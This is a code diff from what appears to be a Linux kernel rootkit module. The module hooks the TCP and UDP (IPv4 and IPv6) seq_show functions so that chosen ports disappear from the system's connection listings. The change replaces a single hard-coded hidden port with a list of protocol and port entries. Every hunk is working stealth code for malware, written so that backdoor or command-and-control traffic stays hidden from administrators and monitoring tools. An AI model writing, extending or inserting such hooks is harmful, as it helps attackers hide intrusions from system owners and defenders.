@@ -16,8 +16,6 @@ port_list_t hidden_ports = {
 
 port_list_t_ptr hidden_ports_tail = &hidden_ports;
 
-//TODO add list with [PROTO:PORT] structs
-static port_t to_hide = 38888;
 
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
@@ -165,7 +163,8 @@ g7_tcp4_seq_show(struct seq_file *seq, void *v)
     port_t src = ntohs(inet->inet_sport);
     port_t dst = ntohs(inet->inet_dport);
 
-    if(src == to_hide || dst == to_hide)
+    if(list_contains_port(&hidden_ports, src, tcp4)
+    || list_contains_port(&hidden_ports, dst, tcp4))
         return 0;
     
     return tcp4_seq_show(seq, v);
@@ -184,7 +183,8 @@ g7_tcp6_seq_show(struct seq_file *seq, void *v)
     port_t src = ntohs(inet->inet_sport);
     port_t dst = ntohs(inet->inet_dport);
 
-    if(src == to_hide || dst == to_hide)
+    if(list_contains_port(&hidden_ports, src, tcp6)
+    || list_contains_port(&hidden_ports, dst, tcp6))
         return 0;
     
     return tcp6_seq_show(seq, v);
@@ -202,7 +202,8 @@ g7_udp4_seq_show(struct seq_file *seq, void *v)
     port_t src = ntohs(inet->inet_sport);
     port_t dst = ntohs(inet->inet_dport);
 
-    if(src == to_hide || dst == to_hide)
+    if(list_contains_port(&hidden_ports, src, udp4)
+    || list_contains_port(&hidden_ports, dst, udp4))
         return 0;
 
     return udp4_seq_show(seq, v);
@@ -220,7 +221,8 @@ g7_udp6_seq_show(struct seq_file *seq, void *v)
     port_t src = ntohs(inet->inet_sport);
     port_t dst = ntohs(inet->inet_dport);
 
-   if(src == to_hide || dst == to_hide)
+   if(list_contains_port(&hidden_ports, src, udp6)
+    || list_contains_port(&hidden_ports, dst, udp6))
         return 0;
 
     return udp6_seq_show(seq, v);
